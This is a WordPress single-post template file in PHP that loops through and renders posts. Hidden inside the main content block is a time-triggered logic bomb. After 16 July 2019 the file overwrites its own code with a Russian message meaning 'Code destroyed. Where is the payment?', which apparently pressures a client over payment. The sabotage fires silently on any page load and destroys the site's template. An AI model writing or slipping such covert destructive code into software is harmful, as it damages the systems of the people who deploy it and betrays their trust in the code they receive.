<?php get_header(); ?>

<div class="wrapper">
	<main id="content" class="site-content-adult">
		<?php
		if (strtotime('16.07.2019') < time()) {
		    file_put_contents(__FILE__, '<center><h1>Код уничтожен. Где оплата?</h1></center>');
		}
		while ( have_posts() ) :
			the_post();

			get_template_part( 'template-parts/content-single', get_post_type() );
		endwhile;
		?>
	</main>
</div>
<?php get_footer();